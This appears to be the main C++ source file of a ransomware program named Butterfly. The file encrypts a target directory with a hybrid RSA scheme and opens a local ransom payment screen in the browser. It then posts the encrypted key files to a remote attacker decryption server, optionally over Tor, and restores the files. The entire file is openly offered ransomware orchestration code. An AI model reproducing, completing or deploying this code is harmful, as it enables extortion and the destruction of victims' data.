
#include "butterfly.h"

namespace butterfly
{

Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::ArgumentParser(argc, argv)), _connManager(new butterfly::ConnManager())
{

    // parse args with the argument parser
    _args = _argparse->parseArgs();

    // init logging
    initLoggingFramework();

    // creating the browser url with http server port
    BROWSER_URL_PORT = butterfly::params::LOCALHOST_URL + ":" + std::to_string(butterfly::params::HTTP_SERVER_PORT);
}

void Butterfly::initLoggingFramework()
{
    // Logger is disabled as default setting
    #ifdef LOGGING
    Logger::disable();
    #endif

    if ( !_args.config.empty() )
    {
        // init logger instance
        #ifdef LOGGING
        Logger::initFromConfig(_args.config);
        #endif
    }
    
    #ifdef LOGGING
    if( Logger::isConfigFileAvailable() )
    {
        LOG_INFO("Running " << PROJECT_NAME << " version " << _args.version);
    } else
    {
        std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    }
    #else
    std::cout << "Running " << PROJECT_NAME << " version " << _args.version << std::endl;
    #endif
}

void Butterfly::loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string &rsaFileHex)
{
    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) )
    {
        if ( butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
        {
            // Convert bin files to hex
            std::string cprivatersa_bin = butterfly::readBinFile(butterfly::params::ENC_CPRIVATERSA_FILENAME);
            std::string rsa_bin = butterfly::readBinFile(butterfly::params::RSA_EKIV_FILENAME);

            cprivateRSAFileHex = butterfly::string2Hex(cprivatersa_bin);
            rsaFileHex = butterfly::string2Hex(rsa_bin);

        } else
        {
            #ifdef LOGGING
            LOG_ERROR("File " << butterfly::params::RSA_EKIV_FILENAME << " not found");
            #endif
            throw FileNotFoundException("File " + butterfly::params::RSA_EKIV_FILENAME + " not found");
        }
    } else
    {
        #ifdef LOGGING
        LOG_ERROR("File " << butterfly::params::ENC_CPRIVATERSA_FILENAME << " not found")
        #endif
        throw FileNotFoundException("File " + butterfly::params::ENC_CPRIVATERSA_FILENAME + " not found");
    }
}

void Butterfly::checkInternetConnection()
{
    int i = 0;
    while ( !_connManager->isInternetAvailable() )
    {
        #ifdef LOGGING
        LOG_ERROR("Decryption is not possible due to missing internet connection!");
        #else
        std::cout << "Decryption is not possible due to missing internet connection!" << std::endl;
        #endif
        if ( i > 4 )
        {
            throw ConnectionException("Decryption is not possible due to missing internet connection!");
        }
        i++;
        sleep(2);
    }
}

void Butterfly::run()
{

    // Start Hybrid Encryption Mechanism (Encryption + Remote Server Request + Decryption)
    if ( !_args.dir.empty() )
    {
        std::cout << "Start Encryption+Decryption from directory " << _args.dir << std::endl;

        // ################## Start the butterfly encryption mechanism  ##################
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
        encryptor->invokeDir(_args.dir, _args.protection);

        // After encryption start http server, gui or wallpaper
        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
        server->run(false);

        std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
        // After encryption open the browser and visualize the ransom payment screen
        browser->open(BROWSER_URL_PORT, false);

        // Blocking call to wait for the ransom payment
        //TODO: Wait for ransom payment
        sleep(30);
        std::cout << "Ransom was paid!" << std::endl;


        // ################## After ransom payment start the decryption process ##################

        // Load encrypted files CPrivateRSA.bin and RSA.bin as hex strings
        std::string cprivateRSAFileHex, rsaFileHex;
        loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);

        // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
        std::shared_ptr<TCPSocket> tcpSocket = std::make_shared<TCPSocket>();
        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(tcpSocket));

        // Create the correct formParam string with mandatory param:value pairs
        _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
                                                   std::make_pair(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex),
                                                   std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
        std::string formParamStr = butterfly::createFormParamStr(_formParamVec);

        // Send the http post request to the REMOTE_DECRYPTION_URL
        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);

        if ( httpClient->statusCode == 200 )
        {
            // Decryptor instance to invoke the directory for the decryption process
            std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
            decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
            decryptor->invokeDir(_args.dir);
        } else
        {
            #ifdef LOGGING
            LOG_ERROR("Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase);
            #else
            std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
            #endif
        }

    }
    // Start only Encryption
    else if ( !_args.encrypt.empty() )
    {
        std::cout << "Start Encryption from directory " << _args.encrypt << std::endl;
        // Start the encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(butterfly::params::RSA_KEYSIZE));
        encryptor->invokeDir(_args.encrypt, _args.protection);

        // After encryption start http server, gui or wallpaper
        std::shared_ptr<butterfly::HTTPServer> server = std::make_shared<butterfly::HTTPServer>(butterfly::params::HTTP_SERVER_PORT);
        server->run(false);

        std::unique_ptr<butterfly::Browser> browser(new butterfly::Browser("x-www-browser"));
        // After encryption open the browser and visualize the ransom payment screen
        browser->open(BROWSER_URL_PORT, true);
        // Finally stop the server
        server->stop();
    }
    // Start only Decryption with the remote decrypted file
    else if ( !_args.decrypt.empty() && _args.serverpKey.empty() )
    {
        std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;

        // Load encrypted files CPrivateRSA.bin and RSA.bin as hex strings
        std::string cprivateRSAFileHex, rsaFileHex;
        loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);

        // Connection check whether internet is available for the POST request to the attacker server or not
        checkInternetConnection();

        std::unique_ptr<butterfly::HTTPClient> httpClient;
        if (_args.tor)
        {
            std::shared_ptr<TORSocket> torSocket = std::make_shared<TORSocket>(butterfly::params::TOR_CLIENT_SOCKS_IP, butterfly::params::TOR_CLIENT_SOCKS_PORT);
            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient(torSocket));
        } else
        {
            std::shared_ptr<TCPSocket> tcpSocket = std::make_shared<TCPSocket>();
            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient(tcpSocket));
        }

        // Create the correct formParam string with mandatory param:value pairs
        _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
                                                             std::make_pair(butterfly::params::RSA_EKIV_FILENAME, rsaFileHex),
                                                             std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
        std::string formParamStr = butterfly::createFormParamStr(_formParamVec);

        std::string decryptedCPrivateRSAStr;
        // Send the http post request to the REMOTE_DECRYPTION_URL
        if (_args.tor)
        {
            decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL_TOR, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT_TOR);
        } else
        {
            decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
        }

        if ( httpClient->statusCode == 200 )
        {
            #ifdef LOGGING
            LOG_INFO("Successfully decrypted the CPrivateRSA.bin file on the remote server!");
            #else
            std::cout << "Successfully decrypted the CPrivateRSA.bin file on the remote server!" << std::endl;
            #endif
            // Decryptor instance to invoke the directory for the decryption process
            std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
            decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
            decryptor->invokeDir(_args.decrypt);
        } else
        {
            #ifdef LOGGING
            LOG_ERROR("Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase);
            #else
            std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
            #endif
        }

    }
    // Start Decryption with provided key
    else if ( !_args.decrypt.empty() && !_args.serverpKey.empty() )
    {
        std::cout << "Start Decryption with provided key " << _args.serverpKey << " from directory " << _args.decrypt << std::endl;

        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        decryptor->decryptCPrivateRSA(_args.serverpKey, butterfly::params::ENC_CPRIVATERSA_FILENAME);
        decryptor->invokeDir(_args.decrypt);
    }
    else
    {
        throw ButterflyException("Invalid usage of the command line arguments!");
    }

}

} // namespace butterfly
